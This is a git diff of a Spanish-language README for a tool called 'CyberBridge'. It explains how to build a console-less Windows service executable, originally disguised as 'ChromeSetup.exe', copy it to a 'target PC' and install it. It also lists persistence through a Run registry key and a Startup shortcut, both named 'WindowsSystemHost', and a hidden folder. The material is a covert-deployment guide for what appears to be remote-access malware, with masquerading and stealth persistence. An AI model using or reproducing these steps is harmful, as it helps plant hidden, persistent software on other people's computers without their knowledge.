@@ -134,19 +134,19 @@ python build_client.py
 ### Qué hace este comando:
 1. Compila el cliente en un solo archivo `.exe`
 2. Oculta la ventana de consola (totalmente silencioso)
-3. Genera el archivo en `dist/ChromeSetup.exe`
+3. Genera el archivo en `dist/.exe`
 
 ### Output esperado:
 ```
 [CyberBridge] Building Windows Service .exe…
 ...
-[CyberBridge] Done! → dist/ChromeSetup.exe
+[CyberBridge] Done! → dist/file.exe
 
 ── Next steps (run as Administrator) ──────────────────────
-  dist\ChromeSetup.exe install   ← register service
-  dist\ChromeSetup.exe start     ← start service
-  dist\ChromeSetup.exe stop       ← stop service
-  dist\ChromeSetup.exe remove    ← uninstall service
+  dist\file.exe install   ← register service
+  dist\file.exe start     ← start service
+  dist\file.exe stop       ← stop service
+  dist\file.exe remove    ← uninstall service
 ```
 
 ---
@@ -155,11 +155,11 @@ python build_client.py
 
 ### Opción A: Si compilaste el .exe
 
-Copia `dist/ChromeSetup.exe` a la PC objetivo y ejecuta (como Administrador):
+Copia `dist/file.exe` a la PC objetivo y ejecuta doble click
 
 ```cmd
-dist\ChromeSetup.exe install
-dist\ChromeSetup.exe start
+dist\file.exe install
+dist\file.exe start
 ```
 
 ### Opción B: Si ejecutas desde código Python
@@ -180,7 +180,7 @@ python client/service.py start
 |--------|-------------|
 | **Registry Run key** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSystemHost` |
 | **Startup folder** | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSystemHost.lnk` |
-| **Carpeta oculta** | `%APPDATA%\Microsoft\Windows\SystemHost\ChromeSetup.exe` (atributo oculto) |
+| **Carpeta oculta** | `%APPDATA%\Microsoft\Windows\SystemHost\file.exe` (atributo oculto) |
 | **Sin ventana de consola** | Compilado con `--noconsole` en PyInstaller |
 
 
